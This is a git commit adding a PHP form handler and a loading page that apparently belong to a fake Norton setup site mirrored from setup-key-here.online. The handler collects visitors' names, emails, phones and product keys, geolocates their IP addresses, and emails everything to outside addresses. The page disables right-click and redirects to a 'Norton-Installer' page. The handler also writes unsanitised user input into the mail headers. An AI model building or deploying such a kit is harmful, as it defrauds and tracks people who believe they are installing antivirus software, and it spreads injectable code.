af631530c6493a4916d9df16410da5b0ecc86094
Amankhalsa <66160544+Amankhalsa@users.noreply.github.com>
2022-07-13 14:03:33 +0530

    Send mail using php

---
+++ sendmail.php
@@ -0,0 +1,93 @@
+<?php
+session_start();
+
+function get_client_ip()
+{
+    $ipaddress = '';
+    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
+        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
+    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
+    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
+        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
+    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
+        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
+    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
+        $ipaddress = $_SERVER['HTTP_FORWARDED'];
+    } else if (isset($_SERVER['REMOTE_ADDR'])) {
+        $ipaddress = $_SERVER['REMOTE_ADDR'];
+    } else {
+        $ipaddress = 'UNKNOWN';
+    }
+
+    return $ipaddress;
+}
+$PublicIP = get_client_ip();
+$json     = file_get_contents("http://ipinfo.io/$PublicIP/geo");
+$json     = json_decode($json, true);
+
+$country  = $json['country'];
+$region   = $json['region'];
+$city     = $json['city'];
+
+
+$to = "garvkansal88@gmail.com, info@svprinterworld.com";
+
+    
+
+$subject =$_POST["name"] ;
+$name = $subject;
+$mail_from = $_POST["email"];
+$email=$mail_from;
+$mobile = $_POST["phone"];
+$msg = strtoupper($_POST["pk"]);
+
+
+
+$message = "
+<html>
+<head>
+<title>HTML email</title>
+</head>
+<body>
+<h2>This email is from <a href='https://www.svprinterworld.com/setup-norton/'>svprinterworld</a> for testing Norton (setup-key-here.online):</h2>
+<table  border='2'  cellpadding='15'>
+<tr><th colspan='4'>User Detail</th></tr>
+<tr><td>Name</td><td>$name</td></tr>
+<tr><td>Email</td><td>$email</td></tr>
+<tr><td>Mobile</td><td>$mobile</td></tr>
+<tr><td>Product key:</td><td>$msg</td></tr>
+<tr><th colspan='4'>Location Detail</th></tr>
+<tr><td>country</td><td>$country</td></tr>
+<tr><td>region</td><td>$region</td></tr>
+<tr><td>city</td><td>$city</td></tr>
+<tr><td>IP</td><td>$PublicIP</td></tr>
+</table>
+</body>
+</html>
+";
+
+// Always set content-type when sending HTML email
+
+$headers = "MIME-Version: 1.0" . "\r\n";
+$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
+
+// More headers
+// $headers .= 'From: $email' ;
+ $headers  .= "From: $mail_from \r\n"; 
+// $headers .= 'Cc: myboss@example.com' . "\r\n";
+
+if(mail($to,$subject,$message,$headers)){
+    
+@ $_SESSION["success"] = "Hi <b>$name....!</b> We've recived your information ";
+
+header("Location: https://www.svprinterworld.com/setup-norton/sendmailler.php");    
+    
+}
+else {
+    @ $_SESSION["success"] = " Try again........! ";
+    header("Location: https://www.svprinterworld.com/setup-norton/");    
+}
+
+
+?>
---
+++ sendmailler.php
@@ -0,0 +1,91 @@
+
+
+<!DOCTYPE html>
+<html lang="en-US">
+
+
+<head>
+
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+
+
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+
+<title>Loading </title>
+<!-- for-mobile-apps -->
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<meta name="keywords" content=" ">
+<meta http-equiv="refresh" content="6.9;url=Norton-Installer.html">
+<!-- //for-mobile-apps -->
+<link href="loading_files/bootstrap.html" rel="stylesheet" type="text/css" media="all">
+<link href="loading_files/style.html" rel="stylesheet" type="text/css" media="all">
+<!-- js -->
+
+<script>
+function isNumber(evt) {
+    evt = (evt) ? evt : window.event;
+    var charCode = (evt.which) ? evt.which : evt.keyCode;
+    if (charCode > 31 && (charCode < 48 || charCode > 57)) {
+        return false;
+    }
+    return true;
+}
+</script>
+<!-- //js -->
+<!-- font-awesome icons -->
+<link rel="stylesheet" href="loading_files/font-awesome.min.html">
+<!-- //font-awesome icons -->
+<link href="loading_files/css.html" rel="stylesheet">
+<link href="loading_files/css(1).html" rel="stylesheet" type="text/css">
+
+	
+
+</head>
+<body oncontextmenu="return false;">
+	
+	<div class="col-xs-12 padtop text-center" style="padding-top:30px;">
+	<p style="text-align:center"><img src="images/lity.png" width="15%"></p>
+
+	<p style="text-align:center"><img src="mcafee/loading_files/loding.gif"></p>
+		<p style="text-align:center"><img src="mcafee/loading_files/sd.png"></p>
+	
+	<h2> </h2>
+	
+</div>
+		
+		<div class="col-sm-3">&nbsp;</div> 
+		<!--<div class="col-sm-6 homeform">
+		</div>
+		</div>
+	</div>-->
+<!-- //banner -->
+<!-- footer -->
+<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+			<div class="container" style="padding-top:30px;">
+				
+				
+				 <p style="padding-top:30px; text-align:center;">© office 2022 <a href="#">Accessibility</a> | <a href="#">Developers
+				 </a> | <a href="#">Privacy and Cookies</a> | <a href="#">Legal</a> | <a href="#">Trademarks</a> </p>
+				
+		</div>
+			 
+<!-- //footer -->
+<!-- for bootstrap working -->
+	<script src="loading_files/bootstrap.js.html"></script>
+<!-- //for bootstrap working -->
+
+
+
+<!--Start of Tawk.to Script-->
+
+<!--End of Tawk.to Script-->
+</body>
+
+
+<!-- Mirrored from setup-key-here.online/sendmailler.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 11 Jan 2022 10:10:57 GMT -->
+</html>
